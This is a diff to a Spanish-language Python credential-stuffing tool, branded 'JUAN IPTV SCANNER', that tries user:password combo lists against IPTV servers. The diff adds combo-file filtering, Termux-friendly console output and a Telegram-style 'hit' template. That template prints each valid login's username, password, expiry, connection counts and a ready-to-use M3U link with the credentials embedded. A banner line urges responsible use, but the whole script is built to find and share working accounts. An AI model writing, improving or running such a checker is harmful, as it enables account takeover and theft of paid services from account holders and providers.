@@ -36,12 +36,16 @@ def mostrar_banner():
     print("  [!] Uso responsable. No atacar servidores ajenos.\n")
 
 def cargar_combos(ruta_archivo):
-    """Carga combos desde archivo (formato usuario:contraseña)."""
+    """Carga combos desde archivo ignorando comentarios y líneas de formato de otros checkers."""
     combos = []
     try:
         with open(ruta_archivo, 'r', encoding='utf-8', errors='ignore') as f:
             for linea in f:
                 linea = linea.strip()
+                # Ignorar comentarios, líneas vacías o encabezados de formato obsoletos
+                if not linea or linea.startswith('#') or linea.lower().startswith('format'):
+                    continue
+                
                 if ':' in linea:
                     user, pwd = linea.split(':', 1)
                     combos.append((user, pwd))
@@ -68,22 +72,61 @@ def probar_combo(server, user, pwd, timeout=10):
     return False, None
 
 def guardar_hit(server, user, pwd, info, archivo_salida):
-    """Guarda un hit encontrado en el archivo de resultados."""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    exp_date = info.get('user_info', {}).get('exp_date', 'N/A')
+    """Guarda un hit encontrado en el archivo con formato premium estilo Telegram."""
+    user_info = info.get('user_info', {})
+    
+    # Manejo del estado de la cuenta
+    is_active = user_info.get('status', 'Active')
+    status_emoji = "🟢 ACTIVA" if is_active.lower() == 'active' else "🔴 INACTIVA"
+    
+    # Formatear fecha de expiración
+    exp_date = user_info.get('exp_date', 'N/A')
     if exp_date and exp_date != 'N/A':
         try:
-            exp_date = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
+            exp_date = datetime.fromtimestamp(int(exp_date)).strftime('%d/%m/%Y')
         except:
             pass
-    active_cons = info.get('user_info', {}).get('active_cons', 'N/A')
-    max_cons = info.get('user_info', {}).get('max_connections', 'N/A')
+            
+    # Conexiones
+    active_cons = user_info.get('active_cons', '0')
+    max_cons = user_info.get('max_connections', '0')
+    
+    # Intenta parsear listas de contenido si el json base las trae indexadas
+    categories = info.get('categories', {})
+    canales = len(categories.get('live', [])) if 'live' in categories else "Verificando..."
+    peliculas = len(categories.get('movie', [])) if 'movie' in categories else "Verificando..."
+    series = len(categories.get('series', [])) if 'series' in categories else "Verificando..."
+
+    # Construir la estructura visual solicitada
+    plantilla = (
+        f"⛩️ RESULTADO DEL ESCANEO ⛩️\n"
+        f"───────────────────────\n"
+        f" 『 🐉 JUAN IPTV SCANNER 🐉 』\n\n"
+        f" ﹝ 👤 CUENTA ﹞\n"
+        f" ◊ User: {user}\n"
+        f" ◊ Pass: {pwd}\n"
+        f" ◊ Status: {status_emoji}\n"
+        f" ◊ Expiry: {exp_date}\n"
+        f" ◊ Conns: {active_cons}/{max_cons}\n\n"
+        f" ﹝ 📊 CONTENIDO ﹞\n"
+        f" 📺 Canales: {canales}\n"
+        f" 🎬 Películas: {peliculas}\n"
+        f" 🎥 Series: {series}\n\n"
+        f" ﹝ 🌐 SERVIDOR ﹞\n"
+        f" 🔗 Host: {server}\n"
+        f" 📍 IP: Oculta\n"
+        f" ───────────────────────\n"
+        f" 📥 LINK M3U:\n"
+        f" {server}/get.php?username={user}&password={pwd}&type=m3u_plus\n"
+        f" ───────────────────────\n"
+        f" ⏰ {datetime.now().strftime('%H:%M')} | SCAN COMPLETE\n"
+        f"{'='*40}\n\n"
+    )
     
     with open(archivo_salida, 'a', encoding='utf-8') as f:
-        f.write(f"[{timestamp}] {user}:{pwd}\n")
-        f.write(f"  Servidor: {server}\n")
-        f.write(f"  Expira: {exp_date} | Activas: {active_cons} | Max: {max_cons}\n")
-        f.write("-" * 50 + "\n")
+        f.write(plantilla)
+        
+    return plantilla
 
 def trabajador(server, combo_queue, resultados, hits, lock, archivo_salida, estado):
     """
@@ -107,9 +150,16 @@ def trabajador(server, combo_queue, resultados, hits, lock, archivo_salida, esta
             with lock:
                 hits[0] += 1
                 resultados.append((user, pwd, info))
-                guardar_hit(server, user, pwd, info, archivo_salida)
-                # Mostrar hit inmediatamente en pantalla (línea aparte)
-                print(f"\n[+] HIT #{hits[0]}: {user}:{pwd}  [Expira: {info.get('user_info',{}).get('exp_date','N/A')}]")
+                # Guardamos y capturamos la plantilla premium texturizada
+                texto_pantalla = guardar_hit(server, user, pwd, info, archivo_salida)
+                
+                # Limpiar la barra dinámica para que el diseño no se rompa en Termux
+                sys.stdout.write("\r" + " " * 85 + "\r")
+                sys.stdout.flush()
+                
+                # Desplegar hit estructurado en consola
+                print(f"\n[+] ¡HIT ENCONTRADO #{hits[0]}!")
+                print(texto_pantalla)
         
         combo_queue.task_done()
         
@@ -122,9 +172,9 @@ def mostrar_estado(estado, hits, total, iniciado):
     porcentaje = (procesados / total) * 100 if total > 0 else 0
     tiempo_trans = time.time() - iniciado
     cps = procesados / tiempo_trans if tiempo_trans > 0 else 0
-    linea = (f"\r[*] Progreso: {procesados}/{total} combos ({porcentaje:.1f}%) | "
-             f"Hits: {hits[0]} | Combo actual: {estado['actual']:<30} | "
-             f"{cps:.1f} combos/seg   ")
+    linea = (f"\r[*] Progreso: {procesados}/{total} ({porcentaje:.1f}%) | "
+             f"Hits: {hits[0]} | Actual: {estado['actual']:<24} | "
+             f"{cps:.1f} c/s   ")
     sys.stdout.write(linea)
     sys.stdout.flush()
 
